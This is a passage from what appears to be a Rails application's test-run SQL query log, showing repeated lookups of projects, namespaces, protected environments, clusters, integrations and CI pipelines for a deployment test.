\"projects\".\"pool_repository_id\", \"projects\".\"runners_token_encrypted\", \"projects\".\"bfg_object_map\", \"projects\".\"detected_repository_languages\", \"projects\".\"merge_requests_disable_committers_approval\", \"projects\".\"require_password_to_approve\", \"projects\".\"emails_disabled\", \"projects\".\"max_pages_size\", \"projects\".\"max_artifacts_size\", \"projects\".\"remove_source_branch_after_merge\", \"projects\".\"marked_for_deletion_at\", \"projects\".\"marked_for_deletion_by_user_id\", \"projects\".\"autoclose_referenced_issues\", \"projects\".\"suggestion_commit_message\", \"projects\".\"project_namespace_id\", \"projects\".\"hidden\" FROM \"projects\" WHERE \"projects\".\"id\" = 371 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"project_features\".* FROM \"project_features\" WHERE \"project_features\".\"project_id\" = 371 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"routes\".* FROM \"routes\" WHERE \"routes\".\"source_type\" = 'Project' AND \"routes\".\"source_id\" = 371 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"id\" = 848 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"routes\".* FROM \"routes\" WHERE \"routes\".\"source_type\" = 'Namespace' AND \"routes\".\"source_id\" = 848 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"protected_environments\".* FROM \"protected_environments\" WHERE \"protected_environments\".\"project_id\" = 371 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"deployment_approvals\".* FROM \"deployment_approvals\" WHERE \"deployment_approvals\".\"deployment_id\" IN (219, 217, 221) /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"users\".* FROM \"users\" WHERE \"users\".\"id\" IN (485, 487, 489) /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"routes\".* FROM \"routes\" WHERE \"routes\".\"source_id\" = 371 AND \"routes\".\"source_type\" = 'Project' LIMIT 1 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"routes\".* FROM \"routes\" WHERE \"routes\".\"source_id\" = 371 AND \"routes\".\"source_type\" = 'Project' LIMIT 1 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       WITH RECURSIVE \"base_and_ancestors\" AS ((SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"type\" = 'Group' AND \"namespaces\".\"id\" = 848)\n       UNION\n       (SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\", \"base_and_ancestors\" WHERE \"namespaces\".\"type\" = 'Group' AND \"namespaces\".\"id\" = \"base_and_ancestors\".\"parent_id\")) SELECT \"id\" FROM \"base_and_ancestors\" AS \"namespaces\" /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"protected_environments\".* FROM \"protected_environments\" WHERE \"protected_environments\".\"project_id\" = 371 AND \"protected_environments\".\"name\" IN ('environment4', 'environment5', 'environment6') /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"protected_environment_deploy_access_levels\".* FROM \"protected_environment_deploy_access_levels\" WHERE \"protected_environment_deploy_access_levels\".\"protected_environment_id\" IN (11, 12, 13) /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       WITH RECURSIVE \"clusters_cte\" AS ((SELECT \"clusters\".*, NULL AS group_parent_id, 0 AS depth FROM \"clusters\" INNER JOIN \"cluster_projects\" ON \"cluster_projects\".\"cluster_id\" = \"clusters\".\"id\" INNER JOIN \"projects\" ON \"projects\".\"id\" = \"cluster_projects\".\"project_id\" WHERE \"clusters\".\"management_project_id\" = 371 AND \"clusters\".\"cluster_type\" = 3 AND \"projects\".\"namespace_id\" = 848)\n       UNION\n       (SELECT \"clusters\".*, \"projects\".\"namespace_id\" AS group_parent_id, 1 AS depth FROM \"projects\" LEFT OUTER JOIN \"cluster_projects\" ON \"cluster_projects\".\"project_id\" = \"projects\".\"id\" LEFT OUTER JOIN \"clusters\" ON \"clusters\".\"id\" = \"cluster_projects\".\"cluster_id\" WHERE \"projects\".\"id\" = 371)\n       UNION\n       (SELECT \"clusters\".*, \"namespaces\".\"parent_id\" AS group_parent_id, (\"clusters_cte\".\"depth\" + 1) FROM \"clusters_cte\", \"namespaces\" LEFT OUTER JOIN cluster_groups ON cluster_groups.group_id = namespaces.id LEFT OUTER JOIN clusters ON cluster_groups.cluster_id = clusters.id WHERE \"namespaces\".\"id\" = \"clusters_cte\".\"group_parent_id\")) SELECT \"clusters\".* FROM \"clusters_cte\" \"clusters\" WHERE \"clusters\".\"id\" IS NOT NULL AND \"clusters\".\"enabled\" = TRUE AND (environment_scope IN ('*', 'environment4') OR\n         'environment4' LIKE\n           REPLACE(REPLACE(REPLACE(environment_scope,\n                               '%', '\\%'),\n                       '_', '\\_'),\n               '*', '%')\n\n       ) ORDER BY (CASE clusters.management_project_id\n         WHEN 371 THEN 0\n         ELSE depth\n       END) ASC\n       , CASE environment_scope\n         WHEN '*' THEN 0\n         WHEN 'environment4' THEN 2\n         ELSE 1\n       END DESC\n        LIMIT 1 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"clusters\".* FROM \"clusters\" WHERE \"clusters\".\"cluster_type\" = 1 AND \"clusters\".\"enabled\" = TRUE AND (environment_scope IN ('*', 'environment4') OR\n         'environment4' LIKE\n           REPLACE(REPLACE(REPLACE(environment_scope,\n                               '%', '\\%'),\n                       '_', '\\_'),\n               '*', '%')\n\n       ) ORDER BY CASE environment_scope\n         WHEN '*' THEN 0\n         WHEN 'environment4' THEN 2\n         ELSE 1\n       END DESC\n        LIMIT 1 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"integrations\".\"id\", \"integrations\".\"project_id\", \"integrations\".\"created_at\", \"integrations\".\"updated_at\", \"integrations\".\"active\", \"integrations\".\"properties\", \"integrations\".\"push_events\", \"integrations\".\"issues_events\", \"integrations\".\"merge_requests_events\", \"integrations\".\"tag_push_events\", \"integrations\".\"note_events\", \"integrations\".\"category\", \"integrations\".\"wiki_page_events\", \"integrations\".\"pipeline_events\", \"integrations\".\"confidential_issues_events\", \"integrations\".\"commit_events\", \"integrations\".\"job_events\", \"integrations\".\"confidential_note_events\", \"integrations\".\"deployment_events\", \"integrations\".\"comment_on_event_enabled\", \"integrations\".\"instance\", \"integrations\".\"comment_detail\", \"integrations\".\"inherit_from_id\", \"integrations\".\"alert_events\", \"integrations\".\"group_id\", \"integrations\".\"type_new\", \"integrations\".\"vulnerability_events\", \"integrations\".\"archive_trace_events\", \"integrations\".\"encrypted_properties\", \"integrations\".\"encrypted_properties_iv\" FROM \"integrations\" WHERE \"integrations\".\"project_id\" = 371 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"integrations\".\"id\", \"integrations\".\"project_id\", \"integrations\".\"created_at\", \"integrations\".\"updated_at\", \"integrations\".\"active\", \"integrations\".\"properties\", \"integrations\".\"push_events\", \"integrations\".\"issues_events\", \"integrations\".\"merge_requests_events\", \"integrations\".\"tag_push_events\", \"integrations\".\"note_events\", \"integrations\".\"category\", \"integrations\".\"wiki_page_events\", \"integrations\".\"pipeline_events\", \"integrations\".\"confidential_issues_events\", \"integrations\".\"commit_events\", \"integrations\".\"job_events\", \"integrations\".\"confidential_note_events\", \"integrations\".\"deployment_events\", \"integrations\".\"comment_on_event_enabled\", \"integrations\".\"instance\", \"integrations\".\"comment_detail\", \"integrations\".\"inherit_from_id\", \"integrations\".\"alert_events\", \"integrations\".\"group_id\", \"integrations\".\"type_new\", \"integrations\".\"vulnerability_events\", \"integrations\".\"archive_trace_events\", \"integrations\".\"encrypted_properties\", \"integrations\".\"encrypted_properties_iv\" FROM \"integrations\" WHERE \"integrations\".\"instance\" = TRUE AND \"integrations\".\"type_new\" IN ('Integrations::Asana', 'Integrations::Assembla', 'Integrations::Bamboo', 'Integrations::Bugzilla', 'Integrations::Buildkite', 'Integrations::Campfire', 'Integrations::Confluence', 'Integrations::CustomIssueTracker', 'Integrations::Datadog', 'Integrations::Discord', 'Integrations::DroneCi', 'Integrations::EmailsOnPush', 'Integrations::Ewm', 'Integrations::ExternalWiki', 'Integrations::Flowdock', 'Integrations::HangoutsChat', 'Integrations::Harbor', 'Integrations::Irker', 'Integrations::Jira', 'Integrations::Mattermost', 'Integrations::MattermostSlashCommands', 'Integrations::MicrosoftTeams', 'Integrations::Packagist', 'Integrations::PipelinesEmail', 'Integrations::Pivotaltracker', 'Integrations::Prometheus', 'Integrations::Pushover', 'Integrations::Redmine', 'Integrations::Slack', 'Integrations::SlackSlashCommands', 'Integrations::Teamcity', 'Integrations::UnifyCircuit', 'Integrations::WebexTeams', 'Integrations::Youtrack', 'Integrations::Zentao') /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"id\" = 848 LIMIT 1 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"routes\".* FROM \"routes\" WHERE \"routes\".\"source_id\" = 848 AND \"routes\".\"source_type\" = 'Namespace' LIMIT 1 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"ci_pipelines\".* FROM \"ci_pipelines\" WHERE \"ci_pipelines\".\"id\" IN (SELECT \"ci_builds\".\"commit_id\" FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"id\" = 265 LIMIT 1) LIMIT 1 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:ci*/\n\n       SELECT \"ci_pipelines\".* FROM \"ci_pipelines\" WHERE \"ci_pipelines\".\"id\" IN (SELECT \"ci_builds\".\"commit_id\" FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"id\" = 265 LIMIT 1) LIMIT 1 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:ci*/\n\n       SELECT \"ci_builds\".\"id\" FROM \"ci_builds\" INNER JOIN \"ci_builds_metadata\" ON \"ci_builds_metadata\".\"build_id\" = \"ci_builds\".\"id\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"commit_id\" = 220 AND (\"ci_builds\".\"retried\" = FALSE OR \"ci_builds\".\"retried\" IS NULL) /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:ci*/\n\n       SELECT \"ci_pipelines\".* FROM \"ci_pipelines\" WHERE \"ci_pipelines\".\"id\" IN (SELECT \"ci_builds\".\"commit_id\" FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"id\" = 265 LIMIT 1) LIMIT 1 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:ci*/\n\n       SELECT \"ci_pipelines\".* FROM \"ci_pipelines\" WHERE \"ci_pipelines\".\"id\" IN (SELECT \"ci_builds\".\"commit_id\" FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"id\" = 265 LIMIT 1) LIMIT 1 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:ci*/\n\n       SELECT \"ci_builds\".\"id\" FROM \"ci_builds\" INNER JOIN \"ci_builds_metadata\" ON \"ci_builds_metadata\".\"build_id\" = \"ci_builds\".\"id\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"commit_id\" = 220 AND (\"ci_builds\".\"retried\" = FALSE OR \"ci_builds\".\"retried\" IS NULL) /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:ci*/\n\n       SELECT \"deployments\".* FROM \"deployments\" WHERE \"deployments\".\"status\" = 2 AND \"deployments\".\"environment_id\" = 398 AND \"deployments\".\"deployable_id\" = 265 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"id\" = 848 LIMIT 1 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"routes\".* FROM \"routes\" WHERE \"routes\".\"source_id\" = 848 AND \"routes\".\"source_type\" = 'Namespace' LIMIT 1 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       WITH RECURSIVE \"clusters_cte\" AS ((SELECT \"clusters\".*, NULL AS group_parent_id, 0 AS depth FROM \"clusters\" INNER JOIN \"cluster_projects\" ON \"cluster_projects\".\"cluster_id\" = \"clusters\".\"id\" INNER JOIN \"projects\" ON \"projects\".\"id\" = \"cluster_projects\".\"project_id\" WHERE \"clusters\".\"management_project_id\" = 371 AND \"clusters\".\"cluster_type\" = 3 AND \"projects\".\"namespace_id\" = 848)\n       UNION\n       (SELECT \"clusters\".*, \"projects\".\"namespace_id\" AS group_parent_id, 1 AS depth FROM \"projects\" LEFT OUTER JOIN \"cluster_projects\" ON \"cluster_projects\".\"project_id\" = \"projects\".\"id\" LEFT OUTER JOIN \"clusters\" ON \"clusters\".\"id\" = \"cluster_projects\".\"cluster_id\" WHERE \"projects\".\"id\" = 371)\n       UNION\n       (SELECT \"clusters\".*, \"namespaces\".\"parent_id\" AS group_parent_id, (\"clusters_cte\".\"depth\" + 1) FROM \"clusters_cte\", \"namespaces\" LEFT OUTER JOIN cluster_groups ON cluster_groups.group_id = namespaces.id LEFT OUTER JOIN clusters ON cluster_groups.cluster_id = clusters.id WHERE \"namespaces\".\"id\" = \"clusters_cte\".\"group_parent_id\")) SELECT \"clusters\".* FROM \"clusters_cte\" \"clusters\" WHERE \"clusters\".\"id\" IS NOT NULL AND \"clusters\".\"enabled\" = TRUE AND (environment_scope IN ('*', 'environment5') OR\n         'environment5' LIKE\n           REPLACE(REPLACE(REPLACE(environment_scope,\n                               '%', '\\%'),\n                       '_', '\\_'),\n               '*', '%')\n\n       ) ORDER BY (CASE clusters.management_project_id\n         WHEN 371 THEN 0\n         ELSE depth\n       END) ASC\n       , CASE environment_scope\n         WHEN '*' THEN 0\n         WHEN 'environment5' THEN 2\n         ELSE 1\n       END DESC\n        LIMIT 1 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"clusters\".* FROM \"clusters\" WHERE \"clusters\".\"cluster_type\" = 1 AND \"clusters\".\"enabled\" = TRUE AND (environment_scope IN ('*', 'environment5') OR\n         'environment5' LIKE\n           REPLACE(REPLACE(REPLACE(environment_scope,\n                               '%', '\\%'),\n                       '_', '\\_'),\n               '*', '%')\n\n       ) ORDER BY CASE environment_scope\n         WHEN '*' THEN 0\n         WHEN 'environment5' THEN 2\n         ELSE 1\n       END DESC\n        LIMIT 1 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"projects\".\"id\", \"projects\".\"name\", \"projects\".\"path\", \"projects\".\"description\", \"projects\".\"created_at\", \"projects\".\"updated_at\", \"projects\".\"creator_id\", \"projects\".\"namespace_id\", \"projects\".\"last_activity_at\", \"projects\".\"import_url\", \"projects\".\"visibility_level\", \"projects\".\"archived\", \"projects\".\"avatar\", \"projects\".\"merge_requests_template\", \"projects\".\"star_count\", \"projects\".\"merge_requests_rebase_enabled\", \"projects\".\"import_type\", \"projects\".\"import_source\", \"projects\".\"approvals_before_merge\", \"projects\".\"reset_approvals_on_push\", \"projects\".\"merge_requests_ff_only_enabled\", \"projects\".\"issues_template\", \"projects\".\"mirror\", \"projects\".\"mirror_user_id\", \"projects\".\"shared_runners_enabled\", \"projects\".\"runners_token\", \"projects\".\"build_coverage_regex\", \"projects\".\"build_allow_git_fetch\", \"projects\".\"build_timeout\", \"projects\".\"mirror_trigger_builds\", \"projects\".\"pending_delete\", \"projects\".\"public_builds\", \"projects\".\"last_repository_check_failed\", \"projects\".\"last_repository_check_at\", \"projects\".\"only_allow_merge_if_pipeline_succeeds\", \"projects\".\"has_external_issue_tracker\", \"projects\".\"repository_storage\", \"projects\".\"repository_read_only\", \"projects\".\"request_access_enabled\", \"projects\".\"has_external_wiki\", \"projects\".\"ci_config_path\", \"projects\".\"lfs_enabled\", \"projects\".\"description_html\", \"projects\".\"only_allow_merge_if_all_discussions_are_resolved\", \"projects\".\"repository_size_limit\", \"projects\".\"printing_merge_request_link_enabled\", \"projects\".\"auto_cancel_pending_pipelines\", \"projects\".\"service_desk_enabled\", \"projects\".\"cached_markdown_version\", \"projects\".\"delete_error\", \"projects\".\"last_repository_updated_at\", \"projects\".\"disable_overriding_approvers_per_merge_request\", \"projects\".\"storage_version\", \"projects\".\"resolve_outdated_diff_discussions\", \"projects\".\"remote_mirror_available_overridden\", \"projects\".\"only_mirror_protected_branches\", \"projects\".\"pull_mirror_available_overridden\", \"projects\".\"jobs_cache_index\", \"projects\".\"external_authorization_classification_label\", \"projects\".\"mirror_overwrites_diverged_branches\", \"projects\".\"pages_https_only\", \"projects\".\"external_webhook_token\", \"projects\".\"packages_enabled\", \"projects\".\"merge_requests_author_approval\", \"projects\".\"pool_repository_id\", \"projects\".\"runners_token_encrypted\", \"projects\".\"bfg_object_map\", \"projects\".\"detected_repository_languages\", \"projects\".\"merge_requests_disable_committers_approval\", \"projects\".\"require_password_to_approve\", \"projects\".\"emails_disabled\", \"projects\".\"max_pages_size\", \"projects\".\"max_artifacts_size\", \"projects\".\"remove_source_branch_after_merge\", \"projects\".\"marked_for_deletion_at\", \"projects\".\"marked_for_deletion_by_user_id\", \"projects\".\"autoclose_referenced_issues\", \"projects\".\"suggestion_commit_message\", \"projects\".\"project_namespace_id\", \"projects\".\"hidden\" FROM \"projects\" WHERE \"projects\".\"id\" = 371 LIMIT 1 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"ci_pipelines\".* FROM \"ci_pipelines\" WHERE \"ci_pipelines\".\"id\" IN (SELECT \"ci_builds\".\"commit_id\" FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"id\" = 267 LIMIT 1) LIMIT 1 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:ci*/\n\n       SELECT \"ci_pipelines\".* FROM \"ci_pipelines\" WHERE \"ci_pipelines\".\"id\" IN (SELECT \"ci_builds\".\"commit_id\" FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"id\" = 267 LIMIT 1) LIMIT 1 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:ci*/\n\n       SELECT \"ci_builds\".\"id\" FROM \"ci_builds\" INNER JOIN \"ci_builds_metadata\" ON \"ci_builds_metadata\".\"build_id\" = \"ci_builds\".\"id\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"commit_id\" = 222 AND (\"ci_builds\".\"retried\" = FALSE OR \"ci_builds\".\"retried\" IS NULL) /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:ci*/\n\n       SELECT \"ci_pipelines\".* FROM \"ci_pipelines\" WHERE \"ci_pipelines\".\"id\" IN (SELECT \"ci_builds\".\"commit_id\" FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"id\" = 267 LIMIT 1) LIMIT 1 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:ci*/\n\n       SELECT \"ci_pipelines\".* FROM \"ci_pipelines\" WHERE \"ci_pipelines\".\"id\" IN (SELECT \"ci_builds\".\"commit_id\" FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"id\" = 267 LIMIT 1) LIMIT 1 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:ci*/\n\n       SELECT \"ci_builds\".\"id\" 